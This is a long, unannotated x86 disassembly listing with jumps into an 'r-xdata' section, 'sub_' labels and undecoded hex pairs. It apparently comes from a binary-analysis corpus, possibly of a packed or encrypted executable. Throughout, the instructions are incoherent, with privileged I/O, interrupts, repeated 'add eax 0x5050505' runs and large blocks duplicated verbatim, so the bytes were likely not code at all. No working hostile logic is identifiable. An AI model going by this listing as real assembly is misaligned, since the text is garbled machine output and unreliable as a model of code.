imul edi [ ecx + esi * 8 + 0x5a ] 0xe8156a6a
test [ edi + 0x6a43f17c ] edx
push 0x5
sbb al 0xc0
mov eax [ 0x6a43067c ]
push 0x5
adc [ ebp - 0x66 ] dl
adc [ ecx + 0x1c959595 ] edx
jmp 0xffffffffe9f5c964
je r-xdata
lodsb [ esi ]
jmp 0xfffffffff3c5b177
push 0x5
add eax 0xc5050505
push 0xffffffe0
dec ecx
jl r-xdata
add eax 0x1cf3bbff
shl [ ecx - 0x33 ] 0x1
sbb al 0xd0
arpl di di
pushfd
xchg ebp eax
xchg ebp eax
add eax 0x357ccecb
sub_490ffa
push ecx
push 0x6a
add eax 0x69e06a05
push 0xffffffe0
jno r-xdata
add eax 0x7c050505
inc edi
jne r-xdata
retn 0xc689
push 0x5
push 0x5
add eax 0xf3050505
sbb al 0xd0
mov ecx 0xfd6a6a4a
xchg ecx eax
xchg esp eax
xchg ebp eax
xchg ebp eax
jl r-xdata
pop eax
push 0x6a
sbb cl dl
movsd [ edi ] [ esi ]
xchg ebp eax
xchg ebp eax
sbb al 0xd0
inc ebp
sbb [ eax ] dl
adc eax 0x7c6a6a68
out 0x46 eax
push 0x6a
jl r-xdata
add eax 0x16050505
push ecx
cdq
push 0x2
cmp eax 0xae959595
push esi
jl r-xdata
mov ch 0x7c
sub eax 0x7c6a6a5e
mov esi 0x56a6a7a
inc edx
push 0x6a
add eax 0x9469d052
xchg ebp eax
xchg ebp eax
xchg ebp eax
push ds
shr [ ecx + 0x7c ] 0x1
mov esi 0x56a6a45
add eax 0xd81e0505
popfd
jl r-xdata
adc [ eax + 0x53 ] ebx
push 0x6a
std
xchg ebp eax
test [ ebp + 0x5dd01895 ] edx
jl r-xdata
pop ebp
push 0x6a
add eax 0x55100505
0x6a535811 0xfd6a
jge r-xdata
add eax 0x5050505
sbb al 0xd0
push eax
push 0x6a
sbb al 0xd0
jae r-xdata
push 0x6a
push ds
fstp [ ebp + 0x787c521e ]
pop ebp
push 0x6a
add eax 0x5050505
add eax 0x5050505
cmpsb [ esi ] [ edi ]
jns r-xdata
xchg esi eax
inc esp
push 0x6a
jl r-xdata
lea ebp [ edx + 0x6a ]
push 0x5
add eax 0x6a050505
add esp [ ecx ]
xchg ebp eax
xchg ebp eax
xchg ebp eax
0x5cce
jne r-xdata
push 0x5056a6a
add eax 0x2cc40505
movsd [ edi ] [ esi ]
xchg ebp eax
xchg ebp eax
xchg ebp eax
int1
push ds
xchg esp eax
push ds
aad 0x99
push ds
aad 0x99
push ds
xchg ebp eax
push ds
xchg ebp eax
push ds
aad 0x8d
jl r-xdata
push ebp
push 0x5
add eax 0x5050505
add eax 0xa6050505
push 0xffffff9a
sbb edx [ esi + 0x7c6a6a44 ]
outsb
jl r-xdata
inc ebp
push 0x6a
cmpsb [ esi ] [ edi ]
inc edi
retn
rcl [ ecx + 0x5059595 ] 0x5
add eax 0x119a5510
lahf
xchg ebp eax
xchg ebp eax
xchg ebp eax
cmpsb [ esi ] [ edi ]
inc edi
push 0x6a
add eax 0x5050505
add eax 0x96a9e51e
jl r-xdata
add eax 0x5050505
add eax 0x28e07cc2
push 0x6a
add eax 0x5050505
and ebp [ edx + 0x6a ]
test ebx esi
adc [ edi + 0x7c ] al
sbb dl [ ebp + 0x5059595 ]
add eax 0x45cc7c05
push 0x6a
add eax 0x5050505
add eax 0x5050505
add eax 0x75e06a05
jl r-xdata
jg r-xdata
add eax 0x7b119a05
inc esi
pop esi
push 0x6a
add eax 0x5050505
add eax 0x16cecbca
push eax
loope r-xdata
push 0x7d
push 0xffffffc6
shr [ edx + 0x3 ] cl
cmp [ ebp - 0x2fe76a6b ] edx
rol ebp 0x1
push ds
push ebx
jge r-xdata
xchg ecx eax
xchg ebp eax
xchg ebp eax
add eax 0x10050505
push ebp
0x95959f11 0xa695
jl r-xdata
and ebx [ eax + 0x6a ]
push 0x10
push ebp
0x6a764111 0xa66a
push ebp
aad 0x7c
pop ebx
jbe r-xdata
push 0x5
sbb [ eax ] bl
and eax 0x7d6a6a68
xchg edi eax
xchg ebp eax
xchg ebp eax
jl r-xdata
push esi
add eax 0x5050505
add eax 0x677d0505
cwde
xchg ebp eax
xchg ebp eax
cwde
push 0x5
add eax 0x1cf30505
push 0x6a
cmpsb [ gs : esi ] [ edi ]
dec esi
scasb [ edi ]
0xffff8d10 0x6a4c
push 0x7c
add [ edi + 0x6a ] dl
push 0x5
push ds
shr [ ecx + 0x5c ] 0x1
push esi
add eax 0x5050505
add eax 0x467b119a
inc eax
push 0x6a
sub_491056
push ebp
nop
dec [ esi - 0x70 ]
jl r-xdata
add eax 0x5050505
push 0xffffffe5
popfd
push edi
push 0x6a
cmpsb [ esi ] [ edi ]
inc edi
jmp edx
push 0x6a
add eax 0x5050505
int 0xff
sti
push ds
pop ebp
sbb al 0xd8
jge r-xdata
push 0x6a
add eax 0x5050505
add eax 0xd01cf305
add eax 0x119a5510
xchg ecx eax
xchg ebp eax
push edx
sbb al 0xd8
jg r-xdata
jl r-xdata
jl r-xdata
xchg ebp eax
xchg ebp eax
sbb al 0xe9
mov cl 0xb9
lodsb [ esi ]
jmp 0x10e39968
jns r-xdata
sbb al 0xd0
jl r-xdata
lahf
xchg ebp eax
xchg ebp eax
add eax 0xf3050505
push ds
rcl [ edi - 0x4e2e690d ] cl
mov ch 0x7c
sub [ edx + ebp * 2 + 0x6a ] 0x5
add eax 0x5050505
add eax 0x9de56a05
inc edx
push 0x6a
add eax 0x9469d052
xchg ebp eax
xchg ebp eax
xchg ebp eax
push ds
shr [ ecx + 0x7c ] 0x1
mov esi 0x56a6a45
add eax 0xd81e0505
popfd
jl r-xdata
jg r-xdata
add eax 0x5050505
sbb al 0xd0
jge r-xdata
push eax
push 0x6a
sbb al 0xd0
jae r-xdata
push 0x5
sbb al dl
test [ eax + edx * 8 ] ebx
imul edx [ esi ] 0x9a9169d0
and dl [ edi + 0x18 ]
int 0x97
xchg ebp eax
xchg ebp eax
sbb al 0xd0
inc ebp
sbb [ eax ] dl
adc eax 0x7c6a6a68
out 0x46 eax
push 0x6a
jl r-xdata
mov ecx 0xfd6a6a4a
xchg ecx eax
xchg esp eax
xchg ebp eax
xchg ebp eax
jl r-xdata
xchg esi eax
inc esp
push 0x6a
jl r-xdata
lea ebp [ edx + 0x6a ]
push 0x5
add eax 0x6a050505
add esp [ ecx ]
xchg ebp eax
xchg ebp eax
xchg ebp eax
0x5cce
adc [ eax + 0x53 ] ebx
push 0x6a
std
xchg ebp eax
test [ ebp + 0x5dd01895 ] edx
jl r-xdata
pop ebp
push 0x6a
add eax 0x55100505
0x6a535811 0xfd6a
mov ch 0x7c
sub eax 0x7c6a6a5e
mov esi 0x56a6a7a
add eax 0x16050505
push ecx
cdq
push 0x2
cmp eax 0xae959595
push esi
jl r-xdata
jl r-xdata
inc ebp
push 0x6a
cmpsb [ esi ] [ edi ]
inc edi
push 0x6a
push ds
fstp [ ebp + 0x787c521e ]
pop ebp
push 0x6a
add eax 0x5050505
add eax 0x5050505
cmpsb [ esi ] [ edi ]
jns r-xdata
pop eax
push 0x6a
sbb cl dl
movsd [ edi ] [ esi ]
jne r-xdata
push 0x5056a6a
add eax 0x2cc40505
movsd [ edi ] [ esi ]
xchg ebp eax
xchg ebp eax
xchg ebp eax
int1
push ds
xchg esp eax
push ds
aad 0x99
push ds
aad 0x99
push ds
xchg ebp eax
push ds
xchg ebp eax
push ds
aad 0x8d
jl r-xdata
push ebp
push 0x5
add eax 0x5050505
add eax 0xa6050505
push 0xffffff9a
sbb edx [ esi + 0x7c6a6a44 ]
outsb
retn
rcl [ ecx + 0x5059595 ] 0x5
add eax 0x119a5510
lahf
xchg ebp eax
xchg ebp eax
xchg ebp eax
cmpsb [ esi ] [ edi ]
inc edi
push 0x6a
add eax 0x5050505
add eax 0x96a9e51e
jl r-xdata
add eax 0x5050505
add eax 0x28e07cc2
push 0x6a
add eax 0x5050505
and ebp [ edx + 0x6a ]
test ebx esi
adc [ edi + 0x7c ] al
sbb dl [ ebp + 0x5059595 ]
add eax 0x45cc7c05
push 0x6a
add eax 0x5050505
add eax 0x5050505
add eax 0x75e06a05
jl r-xdata
jg r-xdata
add eax 0x7b119a05
inc esi
pop esi
push 0x6a
add eax 0x5050505
add eax 0x16cecbca
push eax
loope r-xdata
push 0x7d
push 0xffffffc6
shr [ edx + 0x3 ] cl
cmp [ ebp - 0x2fe76a6b ] edx
rol ebp 0x1
push ds
push ebx
jge r-xdata
xchg ecx eax
xchg ebp eax
xchg ebp eax
add eax 0x10050505
push ebp
0x95959f11 0xa695
jl r-xdata
and ebx [ eax + 0x6a ]
push 0x10
push ebp
0x6a764111 0xa66a
push ebp
aad 0x7c
pop ebx
jbe r-xdata
push 0x5
sbb [ eax ] bl
and eax 0x7d6a6a68
xchg edi eax
xchg ebp eax
xchg ebp eax
jl r-xdata
push esi
add eax 0x5050505
add eax 0x677d0505
cwde
xchg ebp eax
xchg ebp eax
cwde
push 0x5
add eax 0x1cf30505
push 0x6a
cmpsb [ gs : esi ] [ edi ]
dec esi
scasb [ edi ]
0xffff8d10 0x6a4c
push 0x7c
add [ edi + 0x6a ] dl
push 0x5
push ds
shr [ ecx + 0x5c ] 0x1
push esi
add eax 0x5050505
add eax 0x467b119a
inc eax
push 0x6a
sub_491164
call [ ebp - 0x6aeafc96 ]
xchg ebp eax
xchg ebp eax
jl r-xdata
add eax 0xa76c1605
bound ebp [ edx + 0x6a ]
add eax 0x5050505
add eax 0x641e0505
jl r-xdata
jne r-xdata
push 0x5056a6a
add eax 0x2cc40505
movsd [ edi ] [ esi ]
xchg ebp eax
xchg ebp eax
xchg ebp eax
int1
push ds
xchg esp eax
push ds
aad 0x99
push ds
aad 0x99
push ds
xchg ebp eax
push ds
xchg ebp eax
push ds
aad 0x8d
jl r-xdata
0x6a48b710 0x1e6a
fstp [ ebp + 0x787c521e ]
pop ebp
push 0x6a
add eax 0x5050505
add eax 0x5050505
cmpsb [ esi ] [ edi ]
push ebp
jl r-xdata
inc eax
push 0x6a
add eax 0x6c160505
cmpsd [ esi ] [ edi ]
retn
rcl [ ecx + 0x5059595 ] 0x5
add eax 0x119a5510
lahf
xchg ebp eax
xchg ebp eax
xchg ebp eax
cmpsb [ esi ] [ edi ]
inc edi
push 0x6a
add eax 0x5050505
add eax 0x96a9e51e
jl r-xdata
add eax 0x5050505
add eax 0x28e07cc2
push 0x6a
add eax 0x5050505
and ebp [ edx + 0x6a ]
test ebx esi
adc [ edi + 0x7c ] al
sbb dl [ ebp + 0x5059595 ]
add eax 0x45cc7c05
push 0x6a
add eax 0x5050505
add eax 0x5050505
add eax 0x75e06a05
jl r-xdata
jg r-xdata
add eax 0x7b119a05
inc esi
pop esi
push 0x6a
add eax 0x5050505
add eax 0x16cecbca
push eax
loope r-xdata
push 0x7d
push 0xffffffc6
shr [ edx + 0x3 ] cl
cmp [ ebp - 0x2fe76a6b ] edx
rol ebp 0x1
push ds
push ebx
jge r-xdata
xchg ecx eax
xchg ebp eax
xchg ebp eax
add eax 0x10050505
push ebp
0x95959f11 0xa695
jl r-xdata
and ebx [ eax + 0x6a ]
push 0x10
push ebp
0x6a764111 0xa66a
push ebp
aad 0x7c
pop ebx
jbe r-xdata
push 0x5
sbb [ eax ] bl
and eax 0x7d6a6a68
xchg edi eax
xchg ebp eax
xchg ebp eax
jl r-xdata
push esi
add eax 0x5050505
add eax 0x677d0505
cwde
xchg ebp eax
xchg ebp eax
cwde
push 0x5
add eax 0x1cf30505
push 0x6a
cmpsb [ gs : esi ] [ edi ]
dec esi
scasb [ edi ]
0xffff8d10 0x6a4c
push 0x7c
add [ edi + 0x6a ] dl
push 0x5
push ds
shr [ ecx + 0x5c ] 0x1
push esi
add eax 0x5050505
add eax 0x467b119a
inc eax
push 0x6a
sub_4912db
imul edx [ ebp + 0x7c69d818 ] 0x95959b13
add eax 0x5050505
add eax 0x5050505
add eax 0x565ccad5
0x959d2511 0x7c95
fsubr [ edx ]
push 0x6a
sar [ esi + eax * 4 + 0x40 ] 0x6a
push 0x5
add eax 0x7d050505
stosb [ edi ]
pop esi
push 0x6a
std
cdq
cmp dl [ esi + 0x24 ]
retn 0xd31c
sub_491317
mov [ ebp - 0x5c ] edi
pop esi
push 0x6a
std
pop eax
test [ edi - 0x2ce33d10 ] dl
mov ch 0x7d
mov dh 0x5e
push 0x6a
std
add al [ esi + 0x1cc22bb4 ]
rcr [ ebp + 0x6a5e807d ] cl
push 0x7c
les eax [ edx + ebp * 2 + 0x6a ]
add eax 0x5050505
push 0xffffffc3
loope r-xdata
movsb [ edi ] [ esi ]
jl r-xdata
xchg ebp eax
xchg ebp eax
xchg ebp eax
adc [ ebp - 0x66 ] dl
adc [ eax + 0x4e ] eax
push 0x6a
push ss
pop eax
push 0x6a
add eax 0x5050505
add eax 0x593d7c05
push 0x6a
add eax 0x5050505
lds edi [ ecx + esi * 2 + 0x46 ]
push 0x6a
add eax 0x5050505
add eax 0xf17c4ea6
push edi
push 0x6a
0x6a93d322 0x6dd0
push ss
shr [ ecx - 0x43 ] 0x1
int3
sub_491539
sbb al 0x13
jne r-xdata
imul ebp [ edx + 0x6a ] 0xffffffae
rcr [ ecx + 0x65b2119a ] 0x1
push 0x6a
push 0xffffffd0
xchg ebp eax
xchg ebp eax
jge r-xdata
add eax 0x56cb0505
add eax 0x5050505
add eax 0x99e81605
xchg ebp eax
jl r-xdata
push 0x6a
push 0x5
add eax 0xb76dd052
mov ch 0xb7
mov al 0x7c
xor [ ebx ] esp
push 0x6a
imul ebx [ esi ] 0xd0ae69d0
insd
0x6a751e17 0x7c6a
cmpsd [ esi ] [ edi ]
sub [ edx + 0x6a ] ebp
pop esp
push 0x6a
push ss
push ecx
test [ ebx + edx ] ebx
jno r-xdata
add eax 0x4d1e466a
adc [ esi - 0x66 ] cl
adc [ esi - 0x26a6a6b ] edi
push ebp
jo r-xdata
and eax 0x590b1cc6
xchg ebp eax
xchg ebp eax
xchg ebp eax
jge r-xdata
xchg ebp eax
xchg ebp eax
sbb al dl
popad
lds edi [ edx + edx * 4 + 0x7b ]
push 0x6a
add eax 0x556ce05
add eax 0x94ff0505
std
xchg ebp eax
push ecx
push 0x6a
add eax 0xc5050505
jl r-xdata
pop esp
push 0x6a
std
jg r-xdata
add eax 0xff109a05
and ch [ edx + 0x6a ]
sbb al dl
jge r-xdata
push 0x5
push [ ebp + 0x6a459a7c ]
push 0xffffff9a
adc [ ebp - 0x61 ] ebp
xchg ebp eax
add eax 0x15109a05
dec edi
push 0x6a
jl r-xdata
pop eax
push 0x6a
add eax 0x5050505
jge r-xdata
xchg ebp eax
jg r-xdata
push ebp
jl r-xdata
retn
xchg ebp eax
xchg ebp eax
adc eax 0x7c9de06a
pop edi
add eax 0x95fd94ff
push ecx
push 0x6a
add eax 0x6a26f07d
push 0x16
adc [ ebp - 0x66 ] dl
adc bh bl
sahf
xchg ebp eax
xchg esp eax
xchg ebp eax
xchg ebp eax
add eax 0x14791ec0
jns r-xdata
add eax 0x50556cb
add eax 0x5050505
push ss
call 0xffffffffeec5aa9d
popfd
jl r-xdata
fst [ ecx + 0x6a ]
push 0x5
jge r-xdata
push 0x6a
add eax 0x558e0505
bound ecx [ ebp + 0x5c ]
push esi
push ds
rcr [ ebp + 0x50556c8 ] 0x1
xchg ebp eax
add eax 0x5050505
add eax 0x7cf9ffcd
add al 0x5b
push 0x6a
add eax 0x977d1605
0x1a7c9d22 0x6a6a
push 0x5
sbb al 0xc0
push ebp
sbb al 0xe8
pop edi
sbb al 0xd8
pop ecx
jge r-xdata
push ds
push ebx
jge r-xdata
xchg ebp eax
sbb al dl
jns r-xdata
xchg edi eax
xchg ebp eax
xchg ebp eax
int 0xff
loope r-xdata
ja r-xdata
xchg ebp eax
call [ ecx - 0x6a5a6a03 ]
xchg ebp eax
jl r-xdata
push ecx
test [ esi ] edx
jmp 0x1cde9f47
push 0x6a
push ss
push ds
shr [ ecx - 0x2b ] 0x1
jl r-xdata
sbb al 0xd0
inc ebx
jl r-xdata
and [ edx + 0x6a ] ebp
int3
xchg ebp eax
add eax 0x5050505
and [ edx + 0x6a ] ebp
int3
jl r-xdata
xchg ebp eax
cwde
xchg ebp eax
adc ah al
and ch [ edx + 0x6a ]
sbb al dl
add [ ebx + ecx * 8 + 0x67 ] edi
push 0x6a
add eax 0x5050505
add eax 0xd01e0505
popfd
push 0xffffffc5
int1
jl r-xdata
inc edx
push 0x6a
add eax 0x109a0505
jmp [ edx ]
add eax 0xd01e9d1d
imul edx ebp 0x9598d37c
popfd
enter 0x556 0x5
xchg edi eax
xchg ebp eax
xchg ebp eax
add eax 0x5050505
push 0xffffffc2
lds edx [ eax ]
aas
pop esp
push 0x6a
add eax 0x791e0505
jl r-xdata
dec ecx
sbb [ eax + 0x6a ] dl
push 0x18
fsub [ ecx ]
inc edi
push 0x6a
add eax 0x827c421e
xchg edi eax
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0x187dd818
sar [ 0x6a75c47c ] 0x1
push 0x5
add eax 0x1e050505
inc ebp
sbb al 0xc8
ja r-xdata
add eax 0x1e050505
rcr [ ebp + 0x7cf1c56a ] 0x1
jpo r-xdata
push 0x6a
adc [ ebp - 0x66 ] dl
adc edi ebp
push eax
push 0x6a
cmpsb [ esi ] [ edi ]
push ebp
pop esp
push esi
adc al 0x79
sbb [ ecx - 0x3d3c6a6b ] edx
jl r-xdata
add eax 0x505565c
add eax 0x5050505
push ds
jns r-xdata
push 0x6a
call [ ecx - 0x3a5e2ce8 ]
push ds
shr [ ebp + 0x7c ] 0x1
cld
push 0x6a
sbb al 0xd0
jne r-xdata
add eax 0x5050505
add eax 0xc4791e05
push 0x6a
std
xchg ebp eax
test [ ebp + 0x449e7c95 ] edx
push 0x6a
add eax 0x18119a05
push eax
push 0x6a
sbb al bl
and [ eax ] ebx
shl [ ecx ] 0x1
jge r-xdata
sbb al dl
xor [ ebp - 0x29 ] edi
push ss
xchg ecx eax
jl r-xdata
jl r-xdata
push ds
jb r-xdata
push 0x1cf36a6a
shl [ ebp + 0x1e7cecff ] 0x72
push 0x6a
add eax 0x5050505
add eax 0xc81ccccc
insd
jl r-xdata
xchg ebp eax
xchg ebp eax
xchg ebp eax
push 0xffffffa3
push 0x2
popad
xchg ebp eax
inc edx
push 0x6a
push edx
shr [ edx + ebp * 2 + 0x45 ] 0x1
sbb al 0xc8
imul ebp [ edx - 0x3d ] 0x7c6d1e91
in al dx
arpl [ edx + 0x6a ] bp
add eax 0x5050505
add eax 0x119a0505
rcl [ edx + 0x229a9595 ] 0x1
mov bh [ edi + ebp * 4 + 0x74 ]
push 0x6a
jge r-xdata
xchg ebp eax
add eax 0x26a0505
imul edx [ ebp - 0x5c956a6b ] 0x9561026a
push 0x5
add eax 0x5050505
int3
push 0xfffffff3
sbb al 0xc0
movsd [ edi ] [ esi ]
jns r-xdata
int1
push 0xffffffc2
popfd
jl r-xdata
jge r-xdata
xchg ebp eax
push esi
add eax 0x6a050505
retn 0xc6c5
push 0x5
int3
add eax 0x18d1ff05
sar [ 0xffffffff9f7cc5c6 ] 0x1
pop ebx
push 0x6a
add eax 0x5050505
add eax 0x5050505
add eax 0x4607119a
popad
push 0x6a
lodsb [ esi ]
enter 0x7c69 0x61
xchg esp eax
xchg ebp eax
xchg ebp eax
add eax 0xf3cdf0ff
sbb al 0xd0
arpl [ esp + 0x4d ] di
push 0x6a
std
fadd [ edi + 0x1cc2c78a ]
rol ecx cl
jge r-xdata
push 0xffffffcc
int3
0x95914810 0x7c95
xchg ecx eax
jbe r-xdata
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xe6119a05
push 0x5
add eax 0x5050505
add eax 0xc5d31cc2
jge r-xdata
push ebx
push 0x6a
jl r-xdata
[ edi + 0x6a ]
push 0x5
add eax 0x6310f305
jl r-xdata
pop edi
push 0x6a
add eax 0x10f30505
test [ ecx + eax - 0x64 ] edi
xchg ebp eax
xchg ebp eax
add eax 0xc81cf305
insd
into
sbb al 0xc8
outsd
push esi
jl r-xdata
push 0xffffffc3
inc esi
push 0x6a
sub ch [ 0x7c95959e ]
jecxz r-xdata
push 0x5
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x9a050505
adc esi esp
arpl [ edi + 0x78 ] di
push 0x6a
push ds
push 0x6a
add eax 0x5534f105
xchg ebp eax
jl r-xdata
push ebx
xchg ebp eax
xchg ebp eax
sbb al 0xd0
imul esp [ esi - 0x623e83ab ] 0x5059595
add eax 0x5050505
push 0xffffffc2
leave
jl r-xdata
push 0x5
add eax 0x955534f1
push eax
push 0x6a
sbb al 0xd0
rcr [ ebp + 0x5059595 ] 0x5
add eax 0x6a050505
retn 0x7cc9
js r-xdata
push 0x6a
pop ebp
push 0x6a
add eax 0xf3050505
sbb al 0xe8
push ebp
jl r-xdata
and cl [ edx + 0x6a74af7c ]
push 0x7d
cmp [ ebp + 0x6a ] bh
push 0x6a
add eax 0x7e7c5510
jne r-xdata
dec ebp
push eax
push 0x6a
std
pushad
call 0x1365dfdc
imul edx [ ebp - 0x10836a6b ] 0x9a6a6a70
adc [ ebp + 0x7c6a6a66 ] al
pushfd
push 0x6a
push ss
out dx al
rcl [ ebp + 0x6a5a017c ] cl
push 0x7d
xor dl [ edx + ebp * 2 + 0x6a ]
rol [ ecx + 0x7c ] 0x1
int3
push 0x1e
adc [ ebx + 0x7c ] ah
cmpsd [ esi ] [ edi ]
sub [ edx + 0x6a ] ebp
add eax 0x6a26f47c
push 0xffffff9a
adc [ eax - 0x6f ] cl
xchg ebp eax
xchg ebp eax
jl r-xdata
jl r-xdata
jl r-xdata
push 0x6a
jl r-xdata
add eax 0x9a050505
adc [ edi ] eax
inc esi
popad
push 0x6a
sbb al 0x28
inc ecx
push 0xc36a6a6a
sar [ ebp - 0x6b ] 0x1
push 0xffffffc3
fstp [ esi ]
dec ebp
adc [ esi - 0x66 ] cl
adc [ edi - 0x29595b4 ] esp
div [ edx - 0x62 ]
add al 0xc6
jge r-xdata
xchg esp eax
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0x7ce2ff05
adc edx [ edx - 0xcfa6a6b ]
lodsb [ esi ]
popfd
jl r-xdata
xchg ebp eax
call [ ebp - 0x6ac6fc96 ]
xchg ebp eax
xchg ebp eax
sbb [ eax ] bl
push 0x5
push 0x3
cmp [ ebp - 0x2fe76a6b ] edx
mov ecx 0x7d531ec5
sub bh [ edx ]
push 0x6a
add eax 0x7cc355a6
aad 0x48
push 0x6a
add eax 0x5050505
add eax 0xc56a0505
push 0x6a
push ss
je r-xdata
shr [ ebp + 0x18 ] 0x1
rcl [ ecx ] 0x1
retn
insd
aad 0x9a
pop ss
popfd
xchg ebp eax
xchg ebp eax
xchg ebp eax
call [ ebp - 0x6ac6fc96 ]
push 0x16
add eax 0x7c9dacf3
xor dh [ edx + ebp * 2 + 0x6a ]
add eax 0x109a0505
cdq
push 0x5056a6a
push ds
insb
jl r-xdata
push 0x6a
jge r-xdata
nop
xchg ebp eax
xchg ebp eax
add eax 0xd0180505
and eax 0xa97cc3c5
jle r-xdata
insd
push 0x9b7d6a6a
cmp [ ebp + 0x18189595 ] edx
push 0x6a
add eax 0xc2050505
jl r-xdata
sub [ edx + 0x6a ] ch
add eax 0x5050505
add eax 0xc26ac305
dec esp
push 0x6a
push 0x5
add eax 0x99109a05
xchg ecx eax
sub al 0x6a
push 0xffffff95
xchg ebp eax
jl r-xdata
jl r-xdata
jg r-xdata
jl r-xdata
push esp
push 0x6a
jl r-xdata
push 0x5
add eax 0xd0520505
jno r-xdata
sbb [ ebp + 0x68 ] ch
push 0x6a
jge r-xdata
xchg ebx eax
xchg ebp eax
xchg ebp eax
add eax 0x717c0505
push 0x6a
add eax 0x5050505
sbb al ah
test [ ebp - 0x6f ] edi
pop edx
push 0x6a
int3
0x5ccb
push 0x14
sub ebp [ ecx ]
xchg ebp eax
xchg ebp eax
xchg ebp eax
popad
xchg esp eax
xchg ebp eax
xchg ebp eax
0x95959d19 0xff95
xchg ebp eax
push 0x3
xchg ebp eax
xchg ebp eax
jl r-xdata
add edi [ ecx ]
xchg ebp eax
push 0x5
add eax 0x9a050505
and al [ ebp + 0x18 ]

int1
jl r-xdata
cld
cmpsb [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
push ebx
push 0x6a
add eax 0x7c6c1e05
cmp [ edi + 0x6a ] bh
jge r-xdata
sub_491596
shl [ ecx - 0x68e2837f ] 0x1
fst [ ecx + 0x6a ]
push 0x5
jge r-xdata
push 0x6a
add eax 0x558e0505
bound ecx [ ebp + 0x5c ]
push esi
push ds
rcr [ ebp + 0x50556c8 ] 0x1
xchg ebp eax
call [ ecx - 0x6a5a6a03 ]
xchg ebp eax
jl r-xdata
push 0x6a
push ss
push ds
shr [ ecx - 0x2b ] 0x1
jl r-xdata
sbb al 0xd0
inc ebx
jl r-xdata
add eax 0x95fd94ff
xchg ebp eax
xchg ebp eax
adc eax 0x7c9de06a
pop edi
ja r-xdata
push ecx
test [ esi ] edx
jmp 0x1cde9f47
push ecx
push 0x6a
add eax 0x6a26f07d
push 0x16
jl r-xdata
xchg ebp eax
int 0xff
loope r-xdata
cwde
xchg ebp eax
adc ah al
and ch [ edx + 0x6a ]
sbb al dl
add [ ebx + ecx * 8 + 0x67 ] edi
push 0x6a
add eax 0x5050505
add eax 0xd01e0505
popfd
push 0xffffffc5
int1
jl r-xdata
inc edx
push 0x6a
add eax 0x109a0505
jmp [ edx ]
add eax 0xff109a05
and ch [ edx + 0x6a ]
sbb al dl
jge r-xdata
push 0x5
push [ ebp + 0x6a459a7c ]
push 0xffffff9a
adc [ ebp - 0x61 ] ebp
xchg ebp eax
add eax 0xd01e9d1d
imul edx ebp 0x9598d37c
popfd
enter 0x556 0x5
xchg ebp eax
xchg ebp eax
add eax 0x5050505
push 0xffffffc2
lds edx [ eax ]
xchg edi eax
aas
pop esp
push 0x6a
add eax 0x791e0505
jl r-xdata
dec ecx
push ebp
jl r-xdata
retn
sbb [ eax + 0x6a ] dl
push 0x18
fsub [ ecx ]
inc edi
push 0x6a
add eax 0x827c421e
xchg edi eax
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0x187dd818
sar [ 0x6a75c47c ] 0x1
push 0x5
add eax 0x1e050505
inc ebp
sbb al 0xc8
ja r-xdata
add eax 0x1e050505
rcr [ ebp + 0x7cf1c56a ] 0x1
jpo r-xdata
push 0x6a
adc [ ebp - 0x66 ] dl
adc edi ebp
push eax
push 0x6a
cmpsb [ esi ] [ edi ]
push ebp
pop esp
push esi
adc al 0x79
sbb [ ecx - 0x3d3c6a6b ] edx
jl r-xdata
add eax 0x505565c
add eax 0x5050505
push ds
jns r-xdata
push 0x6a
call [ ecx - 0x3a5e2ce8 ]
push ds
shr [ ebp + 0x7c ] 0x1
cld
push 0x6a
sbb al 0xd0
jne r-xdata
add eax 0x5050505
add eax 0xc4791e05
push 0x6a
std
xchg ebp eax
test [ ebp + 0x449e7c95 ] edx
push 0x6a
add eax 0x18119a05
push eax
push 0x6a
sbb al bl
and [ eax ] ebx
shl [ ecx ] 0x1
jge r-xdata
sbb al dl
xor [ ebp - 0x29 ] edi
push ss
xchg ecx eax
jl r-xdata
jl r-xdata
push ds
jb r-xdata
push 0x1cf36a6a
shl [ ebp + 0x1e7cecff ] 0x72
push 0x6a
add eax 0x5050505
add eax 0xc81ccccc
insd
jl r-xdata
xchg ebp eax
xchg ebp eax
xchg ebp eax
push 0xffffffa3
push 0x2
popad
xchg ebp eax
inc edx
push 0x6a
push edx
shr [ edx + ebp * 2 + 0x45 ] 0x1
sbb al 0xc8
imul ebp [ edx - 0x3d ] 0x7c6d1e91
in al dx
arpl [ edx + 0x6a ] bp
add eax 0x5050505
add eax 0x119a0505
rcl [ edx + 0x229a9595 ] 0x1
mov bh [ edi + ebp * 4 + 0x74 ]
push 0x6a
jge r-xdata
xchg ebp eax
add eax 0x26a0505
imul edx [ ebp - 0x5c956a6b ] 0x9561026a
push 0x5
add eax 0x5050505
int3
push 0xfffffff3
sbb al 0xc0
movsd [ edi ] [ esi ]
jns r-xdata
int1
push 0xffffffc2
popfd
jl r-xdata
jge r-xdata
xchg ebp eax
push esi
add eax 0x6a050505
retn 0xc6c5
push 0x5
int3
add eax 0x18d1ff05
sar [ 0xffffffff9f7cc5c6 ] 0x1
pop ebx
push 0x6a
add eax 0x5050505
add eax 0x5050505
add eax 0x4607119a
popad
push 0x6a
lodsb [ esi ]
enter 0x7c69 0x61
xchg esp eax
xchg ebp eax
xchg ebp eax
add eax 0xf3cdf0ff
sbb al 0xd0
arpl [ esp + 0x4d ] di
push 0x6a
std
fadd [ edi + 0x1cc2c78a ]
rol ecx cl
jge r-xdata
push 0xffffffcc
int3
0x95914810 0x7c95
xchg ecx eax
jbe r-xdata
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xe6119a05
push 0x5
add eax 0x5050505
add eax 0xc5d31cc2
jge r-xdata
push ebx
push 0x6a
jl r-xdata
[ edi + 0x6a ]
push 0x5
add eax 0x6310f305
jl r-xdata
pop edi
push 0x6a
add eax 0x10f30505
test [ ecx + eax - 0x64 ] edi
xchg ebp eax
xchg ebp eax
add eax 0xc81cf305
insd
into
sbb al 0xc8
outsd
push esi
jl r-xdata
push 0xffffffc3
inc esi
push 0x6a
sub ch [ 0x7c95959e ]
jecxz r-xdata
push 0x5
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x9a050505
adc esi esp
arpl [ edi + 0x78 ] di
push 0x6a
push ds
push 0x6a
add eax 0x5534f105
xchg ebp eax
jl r-xdata
push ebx
xchg ebp eax
